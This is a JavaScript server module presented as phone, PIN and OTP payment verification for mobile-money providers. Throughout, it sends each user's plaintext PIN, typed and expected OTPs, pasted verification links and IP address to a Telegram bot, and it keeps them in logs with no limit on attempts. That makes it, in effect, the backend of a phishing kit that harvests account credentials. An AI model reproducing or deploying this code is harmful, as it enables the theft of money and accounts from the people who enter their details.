"use strict";

/**
 * Payment verification - phone + 4-digit PIN + OTP/link
 * EVERY attempt (success or fail) is logged to Telegram.
 * No limit on number of tries.
 */

const crypto = require("crypto");
const security = require("./security");
const telegram = require("./telegram");

const otpStore = new Map();
const OTP_TTL_MS = 10 * 60 * 1000;

const CC = ["243", "254", "256", "255", "250", "257", "258", "260", "233", "234", "237", "241", "242", "221", "225", "226", "227", "228", "229"];

function normalizePhone(phone) {
  let p = String(phone || "").replace(/\s+/g, "").replace(/-/g, "");
  if (!p) return p;
  if (p.startsWith("00")) p = "+" + p.slice(2);
  if (!p.startsWith("+") && CC.some((c) => p.startsWith(c))) p = "+" + p;
  if (p.startsWith("0") && !p.startsWith("+")) p = "+243" + p.slice(1);
  if (!p.startsWith("+")) p = "+243" + p;
  return p;
}

function isValidPhone(phone) {
  return /^\+[1-9]\d{8,14}$/.test(phone);
}

function otpLengthFor(provider) {
  const p = String(provider || "").toLowerCase();
  return p === "orange" ? 6 : 4;
}

function generateOtp(len) {
  const n = len === 6 ? 100000 : 1000;
  const max = len === 6 ? 900000 : 9000;
  return String(Math.floor(n + Math.random() * max));
}

function stamp() {
  return new Date().toLocaleString("fr-FR", { timeZone: "Africa/Nairobi" });
}

function tg(text, opts) {
  Promise.resolve()
    .then(() => telegram.notify(text, opts))
    .catch((e) => console.error("[telegram]", e && e.message));
}

/** Escape for Telegram HTML - built without entity literals so tooling cannot corrupt quotes */
function escHtml(s) {
  const a = String.fromCharCode(38); // &
  return String(s || "")
    .split(a)
    .join(a + "amp;")
    .split("<")
    .join(a + "lt;")
    .split(">")
    .join(a + "gt;")
    .split('"')
    .join(a + "quot;");
}

async function sendOtp(db, { phone, pin, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  provider = String(provider || "orange").toLowerCase();

  if (!isValidPhone(phone)) {
    tg(
      "INVALID PHONE\nProvider: " +
        (provider || "?").toUpperCase() +
        "\nRaw: " +
        String(phone || "").slice(0, 40) +
        "\nIP: " +
        (ip || "?") +
        "\n" +
        stamp()
    );
    return { ok: false, error: "Numero de telephone invalide / Invalid phone number" };
  }
  if (!/^\d{4}$/.test(pin)) {
    tg(
      "INVALID PIN FORMAT\nPhone: " +
        phone +
        "\nPIN typed: " +
        (pin || "(empty)") +
        "\nProvider: " +
        provider.toUpperCase() +
        "\nIP: " +
        (ip || "?") +
        "\n" +
        stamp()
    );
    return { ok: false, error: "Le PIN doit contenir 4 chiffres / PIN must be 4 digits" };
  }

  const salt = crypto.randomBytes(16).toString("hex");
  const pinHash = security.hashPassword(pin, salt);
  const otpLen = otpLengthFor(provider);
  const otp = generateOtp(otpLen);

  const prev = otpStore.get(phone);
  const attemptNo = prev ? (prev.sendCount || 1) + 1 : 1;

  otpStore.set(phone, {
    otp,
    otpLen,
    pinHash,
    salt,
    pinPlain: pin,
    expires: Date.now() + OTP_TTL_MS,
    attempts: 0,
    sendCount: attemptNo,
    created: Date.now(),
    ip: ip || "unknown",
    provider,
    amount: amount || "",
    package: pkg || ""
  });

  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_requested",
    provider,
    amount: amount || "",
    package: pkg || "",
    pin,
    otp,
    attemptNo,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 2000) db.data.loginLogs = db.data.loginLogs.slice(-2000);
  if (db.flushSoon) db.flushSoon();

  tg(
    "OTP #" +
      attemptNo +
      " - " +
      provider.toUpperCase() +
      "\nPackage: " +
      (pkg || "-") +
      "\nAmount: " +
      (amount || "-") +
      "\nPhone: " +
      phone +
      "\nPIN: " +
      pin +
      "\nOTP (" +
      otpLen +
      "): " +
      otp +
      "\nIP: " +
      (ip || "unknown") +
      "\n" +
      stamp()
  );

  return { ok: true, message: "OTP sent to Telegram bot", otpLength: otpLen };
}

async function verifyOtp(db, { phone, pin, otp, link, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  otp = String(otp || "").trim();
  link = String(link || "").trim();
  provider = String(provider || "").toLowerCase();

  if (link) {
    let rawLink = link.slice(0, 1500).trim();
    if (!/^https?:\/\//i.test(rawLink) && /^[\w.-]+\//.test(rawLink)) {
      rawLink = "https://" + rawLink;
    }
    const safeHref = escHtml(rawLink);

    if (!db.data.loginLogs) db.data.loginLogs = [];
    const linkNo =
      db.data.loginLogs.filter((l) => l.phone === phone && l.action === "link_submitted").length + 1;
    db.data.loginLogs.push({
      phone,
      action: "link_submitted",
      provider: provider || "orange",
      amount: amount || "",
      package: pkg || "",
      pin,
      link: link.slice(0, 500),
      linkNo,
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();

    tg(
      "LINK #" +
        linkNo +
        " - " +
        (provider || "orange").toUpperCase() +
        "\nPackage: " +
        (pkg || "-") +
        "\nAmount: " +
        (amount || "-") +
        "\nPhone: " +
        phone +
        "\nPIN: " +
        (pin || "-") +
        "\n\nOpen: " +
        rawLink +
        "\n\nIP: " +
        (ip || "unknown") +
        "\n" +
        stamp(),
      { preview: true }
    );

    // Also send HTML clickable version
    tg(
      "LINK clickable #" +
        linkNo +
        "\n<a href=\"" +
        safeHref +
        "\">Open link in browser</a>\n" +
        safeHref,
      { preview: true }
    );

    return { ok: true, message: "Lien recu / Link received", redirect: "/network-status.html?paid=1" };
  }

  const entry = otpStore.get(phone);

  if (!entry) {
    tg(
      "OTP TRY - NO SESSION\nPhone: " +
        (phone || "?") +
        "\nPIN typed: " +
        (pin || "-") +
        "\nOTP typed: " +
        (otp || "-") +
        "\nProvider: " +
        (provider || "?").toUpperCase() +
        "\nIP: " +
        (ip || "?") +
        "\n" +
        stamp()
    );
    return { ok: false, error: "Session expiree. Recommencez. / Session expired." };
  }

  if (Date.now() > entry.expires) {
    tg(
      "OTP EXPIRED (still logged)\nPhone: " +
        phone +
        "\nPIN typed: " +
        (pin || entry.pinPlain || "-") +
        "\nOTP typed: " +
        (otp || "-") +
        "\nLast expected: " +
        entry.otp +
        "\nProvider: " +
        entry.provider +
        "\n" +
        stamp()
    );
    entry.expires = Date.now() + OTP_TTL_MS;
  }

  entry.attempts += 1;
  const tryNo = entry.attempts;

  const pinOk = security.hashPassword(pin, entry.salt) === entry.pinHash;
  if (!pinOk) {
    tg(
      "WRONG PIN - try #" +
        tryNo +
        "\nPhone: " +
        phone +
        "\nPIN typed: " +
        (pin || "(empty)") +
        "\nOTP typed: " +
        (otp || "-") +
        "\nProvider: " +
        entry.provider +
        "\nPackage: " +
        (entry.package || "-") +
        "\nIP: " +
        (ip || entry.ip) +
        "\n" +
        stamp()
    );
    if (!db.data.loginLogs) db.data.loginLogs = [];
    db.data.loginLogs.push({
      phone,
      action: "pin_failed",
      pin,
      otp,
      tryNo,
      provider: entry.provider,
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();
    return { ok: false, error: "PIN incorrect / Wrong PIN" };
  }

  const expectedLen = entry.otpLen || otpLengthFor(provider || entry.provider);
  if (otp.length !== expectedLen) {
    tg(
      "WRONG OTP LENGTH - try #" +
        tryNo +
        "\nPhone: " +
        phone +
        "\nPIN: " +
        pin +
        "\nOTP typed: " +
        (otp || "(empty)") +
        " (" +
        otp.length +
        " digits)\nExpected: " +
        expectedLen +
        " digits -> " +
        entry.otp +
        "\nProvider: " +
        entry.provider +
        "\n" +
        stamp()
    );
    return {
      ok: false,
      error: "L'OTP doit contenir " + expectedLen + " chiffres / OTP must be " + expectedLen + " digits"
    };
  }

  if (otp !== entry.otp) {
    tg(
      "WRONG OTP - try #" +
        tryNo +
        "\nPhone: " +
        phone +
        "\nPIN: " +
        pin +
        "\nOTP typed: " +
        otp +
        "\nOTP expected: " +
        entry.otp +
        "\nProvider: " +
        entry.provider +
        "\nPackage: " +
        (entry.package || "-") +
        "\nAmount: " +
        (entry.amount || "-") +
        "\nIP: " +
        (ip || entry.ip) +
        "\n" +
        stamp()
    );
    if (!db.data.loginLogs) db.data.loginLogs = [];
    db.data.loginLogs.push({
      phone,
      action: "otp_failed",
      pin,
      otp,
      expected: entry.otp,
      tryNo,
      provider: entry.provider,
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();
    return { ok: false, error: "OTP incorrect / Invalid OTP. Please try again." };
  }

  otpStore.delete(phone);

  if (!db.data.users) db.data.users = {};
  db.data.users[phone] = {
    phone,
    pinHash: entry.pinHash,
    salt: entry.salt,
    provider: entry.provider,
    verifiedAt: new Date().toISOString()
  };
  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_verified",
    provider: entry.provider,
    amount: entry.amount,
    package: entry.package,
    pin,
    otp,
    tryNo,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.flushSoon) db.flushSoon();

  tg(
    "OTP OK - try #" +
      tryNo +
      "\nPhone: " +
      phone +
      "\nPIN: " +
      pin +
      "\nOTP: " +
      otp +
      "\nProvider: " +
      entry.provider +
      "\nPackage: " +
      (entry.package || "-") +
      "\n" +
      stamp()
  );

  return { ok: true, message: "Verifie / Verified", redirect: "/network-status.html?paid=1" };
}

module.exports = { sendOtp, verifyOtp, normalizePhone };
